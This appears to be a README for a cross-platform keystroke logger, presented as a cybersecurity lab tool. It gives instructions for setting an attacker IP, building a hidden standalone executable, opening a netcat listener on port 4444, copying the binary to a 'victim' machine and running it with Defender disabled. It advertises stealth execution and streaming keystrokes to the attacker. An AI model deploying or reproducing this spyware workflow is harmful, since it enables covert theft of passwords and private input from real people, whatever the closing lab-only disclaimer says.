# Network Keystroke Monitor (Lab Edition)

A standalone keystroke logger designed for **cybersecurity lab simulations**. It captures keystrokes on a victim machine and streams them to a Kali Linux listener in real time.

---

## ⚙️ Configuration

Edit the attacker IP before building:

```bash
nano src/main.py
```

Change:

```python
KALI_IP = "192.168.X.X"
```

Replace it with your **Kali Linux IP**.

---

## 🛠️ Build Instructions

### Linux

```bash
pip install pynput pyinstaller
pyinstaller --onefile --clean --paths=src src/main.py
```

Output: `dist/main`

---

### Windows 🪟

Run on a **Windows machine** (PowerShell or CMD):

```powershell
pip install pynput pyinstaller
pyinstaller --onefile --noconsole --clean --paths=src src/main.py
```

Output: `dist/main.exe`  
`--noconsole` hides the terminal window on Windows.

---

## 🧪 Lab Simulation – How to Run

### Lab Setup
- Attacker: Kali Linux
- Victim: Windows / Ubuntu / Arch Linux
- Port: 4444

### Step 1: Attacker (Kali)

```bash
nc -lvp 4444
```

### Step 2: Transfer Binary to Victim

```bash
scp dist/main user@VICTIM_IP:/home/user/
```

### Step 3: Execution

Linux victim:

```bash
chmod +x main
./main
```

Windows victim:

Double‑click `main.exe` (disable Defender for lab testing).

---

## 🛡️ Features

- Cross‑platform (Linux & Windows)
- Standalone executable (no Python required)
- Stealth execution on Windows
- Clean keystroke stream

---

## ⚠️ Disclaimer

For **authorized educational cybersecurity lab use only**. Do **NOT** use on real systems or real users.
